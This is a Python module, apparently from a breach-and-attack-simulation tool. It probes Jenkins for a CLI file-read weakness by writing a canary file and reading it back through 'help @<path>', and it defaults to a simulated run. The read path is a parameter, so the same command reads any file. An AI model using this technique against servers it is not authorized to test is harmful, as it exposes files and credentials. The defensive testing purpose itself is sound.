import shlex
import subprocess
from datetime import datetime, timezone


def _run_command(command, timeout=20):
    completed = subprocess.run(
        ["sh", "-lc", command],
        capture_output=True,
        text=True,
        timeout=timeout,
    )

    return {
        "command": command,
        "returncode": completed.returncode,
        "stdout": completed.stdout.strip(),
        "stderr": completed.stderr.strip(),
    }


def _build_probe_command(target, params):
    jenkins = target.get("jenkins", {})
    jenkins_url = params.get("jenkins_url") or jenkins.get("url", "http://127.0.0.1:8080")
    cli_jar_path = params.get("cli_jar_path") or jenkins.get("cli_jar_path", "/tmp/jenkins-cli.jar")
    safe_read_path = params.get("safe_read_path") or jenkins.get(
        "safe_read_path",
        "/tmp/sb01-bas-cli-read-canary.txt",
    )
    marker = params.get("marker") or f"SB01_BAS_T1190_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"

    quoted_marker = shlex.quote(marker)
    quoted_safe_path = shlex.quote(safe_read_path)
    quoted_cli_jar = shlex.quote(cli_jar_path)
    quoted_jenkins_url = shlex.quote(jenkins_url)

    return (
        f"printf '%s\\n' {quoted_marker} > {quoted_safe_path}; "
        f"if [ -r {quoted_cli_jar} ]; then "
        f"java -jar {quoted_cli_jar} -s {quoted_jenkins_url} help @{quoted_safe_path} 2>&1 | head -20; "
        f"else "
        f"curl -sS -o /dev/null -w 'jenkins_cli_endpoint_http=%{{http_code}}\\n' {quoted_jenkins_url}/cli/; "
        f"fi"
    )


def run(target, params=None):
    params = params or {}
    behavior = params.get("behavior", "jenkins_cli_file_read")
    evidence_key = params.get("evidence_key", behavior)
    execution_mode = params.get("_execution_mode", "simulation")
    command = _build_probe_command(target, params)

    if execution_mode == "simulation":
        return {
            "status": "success",
            "simulated": True,
            "execution_mode": execution_mode,
            "message": "Simulated safe Jenkins CLI file-read canary probe",
            "behavior": behavior,
            "evidence_key": evidence_key,
            "commands": [
                {
                    "command": command,
                    "returncode": 0,
                    "stdout": "simulated safe canary probe",
                    "stderr": "",
                }
            ],
            "artifacts": [
                "Jenkins CLI endpoint access",
                "Canary file path only; no sensitive file content is read or printed",
            ],
        }

    result = _run_command(command, timeout=int(params.get("timeout", 20)))

    return {
        "status": "success" if result["returncode"] == 0 else "failed",
        "execution_mode": execution_mode,
        "message": "Safe Jenkins CLI file-read canary probe executed",
        "behavior": behavior,
        "evidence_key": evidence_key,
        "commands": [result],
        "artifacts": [
            "Jenkins CLI endpoint access",
            "Local canary file used instead of sensitive system files",
        ],
    }
